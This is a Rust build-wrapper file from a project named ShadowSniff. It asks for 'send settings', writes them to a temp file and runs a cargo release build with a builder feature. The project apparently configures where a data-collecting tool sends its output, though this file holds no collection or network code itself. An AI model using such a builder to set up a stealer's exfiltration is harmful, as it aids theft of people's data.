/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use std::fs;
use std::io::Write;
use std::process::{Command, Stdio};
use tempfile::NamedTempFile;
use builder::Ask;
use builder::send_settings::SendSettings;

fn build(send_settings: SendSettings) {
    let mut send_expr_file: NamedTempFile = NamedTempFile::new().unwrap();
    write!(send_expr_file, "{}", send_settings.gen_expr()).unwrap();
    let send_expr_file = fs::canonicalize(send_expr_file.path()).unwrap();

    println!("Starting building...");

    let _ = Command::new("cargo")
        .arg("build")
        .arg("--release")
        .arg("--features")
        .arg("builder_build")
        .env("BUILDER_SENDER_EXPR", send_expr_file.display().to_string())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .status()
        .expect("Failed to start cargo build");
}


fn main() {
    let send = SendSettings::ask().unwrap();
    build(send);
}